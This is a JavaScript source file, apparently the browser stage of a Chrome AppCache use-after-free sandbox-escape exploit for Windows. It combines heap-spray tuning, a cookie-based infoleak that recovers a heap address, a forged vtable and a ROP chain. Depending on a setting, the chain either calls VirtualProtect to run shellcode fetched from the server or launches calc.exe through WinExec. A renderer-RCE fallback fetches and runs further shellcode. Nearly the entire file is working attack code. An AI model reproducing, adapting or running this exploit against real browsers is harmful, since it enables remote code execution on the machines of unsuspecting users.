// Set this to 'shellcode' to execute /final_shellcode.bin fetched from the server
var FINAL_PAYLOAD_TYPE = 'notepad';  // shellcode / notepad
var INSTRUMENTATION_TYPE = 'patch'; // rce / patch

var final_shellcode;

var BASE = 0x100000000;

// Exploit spray parameters
// TODO: experiment with different values for below
// to find faster/more reliable leaking

// observation:
// successes seem to occur together

// These experimental values were measured on localhost
// TODO: test across the network/simulate net slowdown
// by inserting random sleeps here

// 300: 3/10
// 0: 0/1
// 150: 5/10
// 500: 0/3 // info leak works pretty well, but code exec fails
// TODO: split this into two IDLES: for info leak and for code exec
var IDLE_MS = 300;

// false: 3/10
// true: 5/10 // lots of failures to find a pointer in leaked bytes
var CLEAR_BLOBS_EACH_ATTEMPT = false;

// 0xa0 (160): 3/10
// 0: 4/10
// 80: 5/10

// 320: 17/30 successes/attempts
// failure types:
// 1 crash during infoleak itself
// 4 crash w/ valid heap, invalid payload
// 2 leak didn't have a pointer in it
// 2 fake ascii pointer in info leak

var INITIAL_SPRAY = 320;

// 0xa0 (160): 3/10
// 0: 5/10
// ^ started using guest mode here
// 80: 5/10
// 320: 8/10
// 320 try 2: 3/7
var PRE_TRIGGER_SPRAY = 0xa0;

// 0xa0 (160): 3/10
// 0: 5/10
// ^ started using guest mode here
// 80: 5/10
// 320: 8/10
var PRE_FREE_SPRAY = 0xa0;
var PRE_COOKIE_SPRAY = 0;

// 0xa0 (160): 3/10
// 0: 0/5
// 80: 6/10
// 320: 0/4
var POST_COOKIE_SPRAY = 0xa0;
// Missing: size of cookie. 108 appears to be pretty
// pointer dense when we can trigger the leak already
// but this could be improved. See pwn.py

async function fetch_final_shellcode() {
    let resp = await fetch('/final_shellcode.bin');
    final_shellcode = await resp.arrayBuffer();
}

function w64(ab, offset, value) {
    var u32 = new Uint32Array(ab);
    u32[offset/4] = value % BASE;
    u32[offset/4+1] = value / BASE;
}

function r64(ab, offset) {
    var u32 = new Uint32Array(ab);
    return u32[offset/4] + BASE * u32[offset/4+1];
}

function log(x) {
    prog.innerText += `[+] ${x}\n`;
}

var prog;
function log_clear(phase) {
    document.getElementById("progress").innerText = "Progress:";
    prog = document.getElementById("progress-"+phase);
    prog.innerText = "";
}

function check_patched() {
    console.log(document.queryCommandValue("is_hacked"));
    return document.queryCommandValue("is_hacked") == "yes_hacked";
}

if (INSTRUMENTATION_TYPE == 'patch' && !check_patched()) {
    log_clear('rce');
    log('Patched renderer not found, falling back to V8 RCE');
    INSTRUMENTATION_TYPE = 'rce';
}

if (INSTRUMENTATION_TYPE == 'rce') {
    var RegisterHost = function(host_id) {
        console.dir(2, document, host_id);
    }

    var UnregisterHost = function(host_id) {
        console.dir(3, document, host_id);
    }

    var strcache = [];
    var strcache_u8 = [];
    for (var i = 0; i < 2; ++i) {
        strcache[i] = new ArrayBuffer(0x100);
        strcache_u8[i] = new Uint8Array(strcache[i]);
    }

    // Parsing ArrayBuffers is way easier than parsing strings
    function cache_str(idx, str) {
        for (var i = 0; i < str.length; ++i)
        strcache_u8[idx][i] = str.charCodeAt(i);
        strcache_u8[idx][str.length] = 0;
        return strcache[idx];
    }

    var SelectCache = function(host_id, doc_url, cache_id, manifest_url) {
        //document.SelectCache(host_id, doc_url, cache_id, manifest_url);
        console.dir(4, document, host_id, cache_str(0, doc_url), cache_id, cache_str(1, manifest_url));
    }

    var tmp_buf = new ArrayBuffer(0x1000000);
    var tmp_buf_u8 = new Uint8Array(tmp_buf);
    var tmp_buf_u32 = new Uint32Array(tmp_buf);
    var Cookies = function() {
        document.cookie;
        console.dir(5, tmp_buf);
        var sz = tmp_buf_u32[0];
        var chars = [];
        for (var i = 0; i < sz; ++i) {
            chars.push(tmp_buf_u8[4+i]);
        }
        return String.fromCharCode.apply(null, chars);
    }

    var Gadgets = function() {
        console.dir(6, tmp_buf);

        return [
            r64(tmp_buf, 0), // WinExec
            r64(tmp_buf, 8), // pivot gadget
            r64(tmp_buf, 6*8), // VirtualProtect
            [
                r64(tmp_buf, 0x10),
                r64(tmp_buf, 0x18),
                r64(tmp_buf, 0x20),
                r64(tmp_buf, 0x28),
            ],
        ]
    }
    
    var check = function() {
        var ab = new ArrayBuffer(0x100);
        console.dir(1, ab);
        if (new Uint8Array(ab)[0] != 0x41) {
            log("No instrumentation found.");
            return false;
        }

        document.cookie = 'foobar=b';
        if (!Cookies().match(/foobar/)) {
            log("Cookie instrumentation does not work.");
            return false;
        }
        Gadgets();
        return true;
    }

} else if (INSTRUMENTATION_TYPE == 'patch') {
    var check = check_patched;

    var RegisterHost = function(host_id) {
        document.writeln("2", host_id.toString());
        // document.RegisterHost(host_id);
    }

    var UnregisterHost = function(host_id) {
        document.writeln("3", host_id.toString());
        // document.UnregisterHost(host_id);
    }

    var SelectCache = function(host_id, doc_url, cache_id, manifest_url) {
        document.writeln("4", host_id.toString(), doc_url, cache_id.toString(), manifest_url);
        // console.dir(4, document, host_id, cache_str(0, doc_url), cache_id, cache_str(1, manifest_url));
    }

    var Cookies = function() {
        var s = ''+document.cookie;
        var chars = [];
        for (var i = 0; i < s.length; i += 2) {
            chars.push(parseInt(s.slice(i, i+2), 16));
        }
        return String.fromCharCode.apply(null, chars);
    }

    var get_gadget = function(name) {
        var s = document.queryCommandValue("get_gadget_" + name);
        log("raw gadget string: " + s);
        var addr = 0;
        for (var i = 0; i < s.length; i++) {
            addr *= 10;
            addr += parseInt(s[i], 10);
        }
        return addr;
    }

    var Gadgets = function() {
        var WinExec = get_gadget("WinExec");
        var longjmp = get_gadget("longjmp");
        var poprcx = get_gadget("poprcx");
        var poprdx = get_gadget("poprdx");
        return [WinExec, longjmp, 0, [poprcx, poprdx]];
    }
} else {
    log("Unknown instrumentation type: " + INSTRUMENTATION_TYPE);
    throw null;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function start_response(req) {
    // Will trigger OnResponseStarted
    await fetch('/complete/'+req+'/1');
}

async function complete_response(req) {
    // Will trigger HandleXXXCompleted
    await fetch('/complete/'+req+'/2');
}

async function complete_all() {
    await fetch('/complete_all');
}

async function idle() {
    await sleep(IDLE_MS);
}

async function reset() {
    await fetch('/reset');
}

function make_seed() {
    return (Math.random() * 1000000000)|0;
}

var blob_spray = [];
var blob_cnt = 0;
function spray_blobs(size, n, c) {
    if (!c) c = 'A';
    var s = 'z_small'+blob_cnt;
    var b = new Blob([s]);
    var bary = [];
    for (var i = 0; i < n; ++i) {
        bary.push(b);
        if (c instanceof ArrayBuffer) {
            var ab = c.slice(0); // make a copy
            w64(ab, ab.byteLength - 8, i);
            bary.push(ab);
        } else {
            var s = 'z_'+blob_cnt+'_'+i+'_';
            s += c.repeat(size-s.length);
            bary.push(s);
        }
    }
    blob_spray.push(new Blob(bary));
    blob_cnt++;
}

function heapspray(loc) {
    var page = new ArrayBuffer(0x1000);

    [WinExec, longjmp, VirtualProtect, pop] = Gadgets();

    /* 
    gadgets:
    pop rcx
    pop rdx
    pop r8
    mov r9, rcx; sub r9, rdx; cmp rcx, rdx; mov qword[r8], r9; sbb eax, eax; and eax, 0x80070216
    */

    log(`WinExec @ 0x${WinExec.toString(16)}`);
    log(`VirtualProtect @ 0x${VirtualProtect.toString(16)}`);
    log(`longjmp gadget @ 0x${longjmp.toString(16)}`);
    log(`pop gadget @ 0x${pop[0].toString(16)}`);
    var ret = pop[0] + 1;

    // AppCacheGroup
    w64(page, 0, 0); // ref_cnt_
    w64(page, 0x9c, 1); // is_obsolete_
    w64(page, 0xe0, 0); // newest_complete_cache_
    w64(page, 0xe8, loc+8); // update_job_

    // empty std::vector
    w64(page, 0xc8, 0); // old_caches_
    w64(page, 0xd0, 0); // old_caches_+8
    w64(page, 0xd8, 0); // old_caches_+0x10

    // AppCacheUpdateJob
    w64(page, 8, loc+0x10-0x38);  // vtable
    w64(page, 0x10, longjmp);  // vtable entry = RIP
    w64(page, 8 + 0x10, loc+0x100);  // new RSP
    w64(page, 8 + 0x50, ret);  // new RIP

    // ROP chain
    var rop;
    if (FINAL_PAYLOAD_TYPE == 'shellcode') {
        var shellcode_addr = loc + 0x300;

        rop = [
            pop[0], loc + 0x200, // rcx = &dummy
            pop[1], 0,           // rdx = 0
            pop[2], loc + 0x200, // r8 = &dummy
            pop[3],              // r9 = rcx - rdx ; touch [r8]
            pop[0], shellcode_addr - shellcode_addr%0x1000, // rcx = shellcode & ~0xfff
            pop[1], 0x1000,           // rdx = 0x1000
            pop[1], 0x40,             // r8 = PAGE_EXECUTE_READWRITE
            VirtualProtect,
            shellcode_addr,
        ];

        (new Uint8Array(page)).set(new Uint8Array(final_shellcode), 0x300);
    } else if (FINAL_PAYLOAD_TYPE == 'notepad') {
        rop = [
            pop[0], loc + 0x200, // rcx = cmd
            pop[1], 5, // rdx = SW_SHOW
            WinExec,
        ];

        var cmd = "calc.exe\0";
        var chars = [];
        for (var i = 0; i < cmd.length; ++i)
            chars.push(cmd.charCodeAt(i));
        (new Uint8Array(page)).set(chars, 0x200);
    } else {
        log("Unknown payload type: " + FINAL_PAYLOAD_TYPE);
        throw null;
    }

    for (var i = 0; i < rop.length; ++i) {
        //log(`ROP 0x${rop[i].toString(16)}`);
        w64(page, 0x100 + 8*i, rop[i]);
    }

    var size = 0x800000;
    var payload = new ArrayBuffer(size); // 16 MiB
    var u8 = new Uint8Array(payload);
    var page8 = new Uint8Array(page);
    for (var i = 0; i < size; i += 0x1000)
        u8.set(page8, i);

    for (var i =  0; i < 100; ++i) {
        w64(payload, size - 8, i);
        blob_spray.push(new Blob([payload]));
    }
}

function c_encode(s) {
    var res = [];
    for (var i = 0; i < s.length; ++i) {
        var c = s.charCodeAt(i);
        if (c < 0x20 || c >= 0x7f || c == 0x5c)
            res.push('\\x' + ('0'+c.toString(16)).slice(-2));
        else
            res.push(String.fromCharCode(c));
    }
    return res.join('');
}

// num_refs = how many references to keep to the deleted AppCache.
// Will return the host IDs which hold the references.
async function trigger(num_refs) {
    var uaf_hosts = [];

    await reset();
    await idle();

    var seed = make_seed();
    var url = document.documentURI + 'trigger/payload/'+seed;

    for (var i = 0; i < num_refs; ++i) {
        uaf_hosts.push(seed+2+i);
    }

    RegisterHost(seed+0);
    RegisterHost(seed+1);
    uaf_hosts.forEach((host) => {
        RegisterHost(host);
    });
    SelectCache(seed+0, url, 0, url);
    log('  Step 1');
    await idle();

    // This will allocate the AppCache (actually OnResponseStarted will already)
    await complete_response(0);
    await idle();

    SelectCache(seed+1, url, 0, url);
    log('  Step 2');
    await idle();

    await complete_response(1);
    await idle();

    uaf_hosts.forEach((host) => {
        SelectCache(host, url, 0, url);
    });
    log('  Step 3');
    await idle();

    await complete_response(2);
    await idle();

    UnregisterHost(seed+1);
    RegisterHost(seed+1);
    SelectCache(seed+1, url, 0, url);
    log('  Step 4');
    UnregisterHost(seed+1);

    return [seed+0, uaf_hosts];
}

// Assign a score for how likely the leaked QWORD is a heap address.
function score_leak(leak_num) {
    var all_ascii = true;
    var unique_chars = new Set();
    var letters = 0;
    while (leak_num > 0) {
        var byte = leak_num & 0xFF;
        if (byte > 0x7f) {
            all_ascii = false;
        }
        if (!byte || String.fromCharCode(byte).match(/[a-zA-Z0-9_ +\-*&%^$#@!{}|[\\\];':"]/))
            letters += 1;
        unique_chars.add(byte);
        leak_num = Math.floor(leak_num / 256);
    }

    // more unique chars is better
    var score = unique_chars.size - letters;

    // non-ascii is even better
    if (!all_ascii) {
        score *= 10;
    }

    return score;
}

function choose_best_leak(leaks) {
    var best_idx = 0;
    var best_score = score_leak(leaks[0]);
    for (var i = 1; i < leaks.length; i++) {
        var score = score_leak(leaks[i]);
        if (score > best_score) {
            best_score = score;
            best_idx = i;
        }
    }
    return leaks[best_idx];
}

// If you see a bad leak choice when debugging, add the
// candidates as a testcase here and make all the tests
// pass!
function choose_best_leak_test() {
    var leaks = [0x797979797979, 0x204cc521c10, 0xffffffff00];
    var best_leak = choose_best_leak(leaks);
    if (best_leak != 0x204cc521c10) {
        alert("test 1 failed");
    }

    var leaks = [0x01dd00323330, 0x01ddf336d0c8];
    var best_leak = choose_best_leak(leaks);
    if (best_leak != 0x01ddf336d0c8) {
        alert("test 2 failed");
    }
}

async function leak_heap_address() {
    if (CLEAR_BLOBS_EACH_ATTEMPT) {
        blob_spray = [];
    }

    if (INITIAL_SPRAY) {
        spray_blobs(0xa0, INITIAL_SPRAY, 'a');
        await idle();
    }

    for (var run = 0;; ++run) {
        log_clear('infoleak');
        log('Infoleak try ' + run);

        if (PRE_TRIGGER_SPRAY) {
            spray_blobs(0xa0, PRE_TRIGGER_SPRAY, 'b');
            await idle();
        }

        var [free, uaf_hosts] = await trigger(100);

        if (PRE_FREE_SPRAY) {
            // Clear free list
            spray_blobs(0xa0, PRE_FREE_SPRAY, 'c');
            await idle();
        }

        // This will free the AppCache
        log('  Triggering');
        UnregisterHost(free);

        if (PRE_COOKIE_SPRAY) {
            spray_blobs(0xa0, PRE_COOKIE_SPRAY, 'a');
        }

        await fetch('/cookies');

        if (POST_COOKIE_SPRAY) {
            spray_blobs(0xa0, POST_COOKIE_SPRAY, 'd');
            await idle();
        }
        
        // Trigger decrement
        var subtract = 96; // should be divisible by 8!
        uaf_hosts.slice(0,subtract).forEach((h) => UnregisterHost(h));
        
        complete_all();
        idle();

        var cookies = Cookies().split('foo; ');

        var leaks = [];
        var leaked = false;
        var leaky_cookie;
        cookies.forEach((cookie) => {
            for (var j = 0; j < cookie.length && !leaked; ++j) {
                if (cookie.charCodeAt(j) == 0) {
                    leaked = true;
                    log('Leak: ' + c_encode(cookie));
                    break;
                }
            }
            for (var j = 0; j + 8 <= cookie.length; j += 8) {
                if (cookie.charCodeAt(j+7) == 0
                        && cookie.charCodeAt(j+6) == 0
                        && cookie.charCodeAt(j+5) < 0x7f
                        && cookie.charCodeAt(j+5) != 0) {
                    value = 0;
                    for (var k = j+5; k >= j; --k)
                        value = value*0x100 + cookie.charCodeAt(k);
                    log(`Potential pointer 0x${value.toString(16)}`);
                    log('  Full leak: ' + c_encode(cookie));
                    leaks.push(value);
                }
            }
        });
        
        if (leaks.length > 0) {
            break;
        }
        // TODO remove later
        if (leaks.length == 0 && leaked) {
            log('Fail. We are bound to crash in the next iteration. No need to try.');
            //throw null;
        }
    }

    return choose_best_leak(leaks);
}

async function apply_patch() {
    if (INSTRUMENTATION_TYPE == 'patch') {
        return check();
    }

    if (INSTRUMENTATION_TYPE == 'rce') {
        let resp = await fetch('/shellcode.bin');
        let patch_shellcode = await resp.arrayBuffer();
        log(`Got ${patch_shellcode.byteLength} bytes of instrumentation code`);

        log('Getting RCE');

        var worker = new Worker('renderer/rce_worker.js');
        worker.postMessage(patch_shellcode);

        // Wait for RCE to succeed.
        do {
            await sleep(2000);
        } while (!check());

        return true;
    }

    log("Unsupported instrumentation type: " + INSTRUMENTATION_TYPE);
    return false;
}


async function uaf_vtable_call(payload) {
    var fake_appcache = new ArrayBuffer(0xa0);
    for (var i = 0; i < 0xa0; i += 8) {
        w64(fake_appcache, i, i*BASE + 0x41414141);
    }

    w64(fake_appcache, 0, 1);
    w64(fake_appcache, 0x10, payload);

    for (var run = 0; ; ++run) {
        log_clear('rip');
        log(`Code exec try ${run}`);
        var [free, uaf_hosts] = await trigger(2);

        log('  Triggering');
        UnregisterHost(free);

        // Reclaim
        for (var i = 0; i < 500; ++i) {
            //var s = '\1\0\0\0'+i;
            //s += 'A'.repeat(0xa0-s.length);
            var s = fake_appcache.slice(0);
            w64(s, 0xa0-8, i);
            new Blob([s]);
        }
        await idle();
        UnregisterHost(uaf_hosts[0]);
    }
}


async function pwn() {
    if (FINAL_PAYLOAD_TYPE == 'shellcode') {
        await fetch_final_shellcode();
    }

    log_clear('rce');

    var patched = await apply_patch();
    if (!patched) {
        log('Renderer patch missing or could not be applied');
        return;
    } else {
        log('Renderer patch successful, proceeding');
    }

    var leak = await leak_heap_address();
    log(`Heap @ 0x${leak.toString(16)}`);

    // location will be ((leak + 0x10000000) & ~0xfff + 0x60)
    var payload = leak + 0x10000000;
    payload -= payload % 0x1000;
    payload += 0x60;
    log(`Payload @ 0x${payload.toString(16)}`);

    heapspray(payload);
    await sleep(500);

    await uaf_vtable_call(payload);
}